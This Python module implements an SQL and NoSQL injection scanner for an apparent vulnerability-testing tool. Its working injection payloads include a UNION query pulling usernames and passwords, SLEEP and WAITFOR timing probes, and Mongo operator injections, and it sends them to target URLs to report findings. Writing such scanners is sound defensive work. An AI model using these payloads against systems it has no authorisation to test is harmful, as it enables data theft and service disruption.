"""SQL/NoSQL injection scanner (union/boolean/time)."""
from __future__ import annotations

import hashlib
from typing import Any, Dict, List

from bugwolf.scanners import Scanner
from bugwolf.scanners.live_finding import LiveFinding


SCHEMA = "bugwolf-scanner-v1"


def _pid(label: str, payload: str) -> str:
    return "sqli-" + hashlib.sha256((label + "|" + payload).encode()).hexdigest()[:10]


class SQLiScanner(Scanner):
    name = "sqli"
    description = "SQL injection (union, boolean, time) and NoSQL injection"
    bug_class = "sqli"
    default_severity = "critical"

    UNION_PAYLOADS = (
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "' UNION SELECT username,password FROM users--",
    )
    BOOLEAN_PAYLOADS = (
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
    )
    TIME_PAYLOADS = (
        ("' OR SLEEP(2)--", "sleep-2"),
        ("1;WAITFOR DELAY '0:0:2'--", "waitfor-2"),
    )
    NOSQL_PAYLOADS = (
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
    )

    def matches(self, target: Dict[str, Any]) -> bool:
        return "url" in target

    def scan(self, target: Dict[str, Any], transport) -> List[LiveFinding]:
        findings: List[LiveFinding] = []
        url = target.get("url", "")
        method = str(target.get("method", "GET")).upper()
        body = str(target.get("body") or "")

        for payload in self.UNION_PAYLOADS:
            f = self._probe(method, url, payload, body, transport, "union")
            if f:
                findings.append(f)

        for true_p, false_p in self.BOOLEAN_PAYLOADS:
            f = self._probe_boolean(method, url, true_p, false_p, body, transport)
            if f:
                findings.append(f)

        for payload, label in self.TIME_PAYLOADS:
            f = self._probe(method, url, payload, body, transport, "time-" + label)
            if f:
                findings.append(f)

        for payload in self.NOSQL_PAYLOADS:
            f = self._probe(method, url, payload, body, transport, "nosql")
            if f:
                findings.append(f)

        return findings

    def _probe(self, method: str, url: str, payload: str,
               body: str, transport, label: str) -> LiveFinding:
        try:
            if method == "GET":
                resp = transport("GET", url,
                                 headers={"X-Test-Payload": payload},
                                 body=None)
            else:
                resp = transport(method, url,
                                 headers={"Content-Type": "application/json"},
                                 body=payload)
        except Exception:
            return None
        rbody = (resp.get("body") or "") if isinstance(resp, dict) else ""
        if "SQL" in rbody.upper() or "syntax" in rbody.lower() or payload in rbody:
            return LiveFinding(
                scanner=self.name,
                bug_class=self.bug_class,
                severity=self.default_severity,
                endpoint=url,
                method=method,
                evidence=f"{label} payload triggered SQL/NoSQL signal",
                reproducer=f"{method} {url}  payload={payload[:60]!r}",
                remediation="Use parameterised queries / prepared statements; never concatenate user input.",
                payload_id=_pid(label, payload),
                extra={"status": resp.get("status")},
            )
        return None

    def _probe_boolean(self, method: str, url: str, true_p: str,
                       false_p: str, body: str, transport) -> LiveFinding:
        try:
            if method == "GET":
                t = transport("GET", url, headers={"X-Test-Payload": true_p}, body=None)
                f = transport("GET", url, headers={"X-Test-Payload": false_p}, body=None)
            else:
                t = transport(method, url,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              body=true_p)
                f = transport(method, url,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              body=false_p)
        except Exception:
            return None
        tlen = len((t.get("body") or "")) if isinstance(t, dict) else 0
        flen = len((f.get("body") or "")) if isinstance(f, dict) else 0
        if tlen != flen and min(tlen, flen) > 0:
            return LiveFinding(
                scanner=self.name,
                bug_class=self.bug_class,
                severity=self.default_severity,
                endpoint=url,
                method=method,
                evidence=f"boolean differential: true={tlen} bytes, false={flen} bytes",
                reproducer=f"true: {true_p[:40]!r}\nfalse: {false_p[:40]!r}",
                remediation="Use parameterised queries; reject boolean-style injections at the boundary.",
                payload_id=_pid("boolean", true_p + "/" + false_p),
                extra={"true_len": tlen, "false_len": flen},
            )
        return None


__all__ = ["SQLiScanner"]
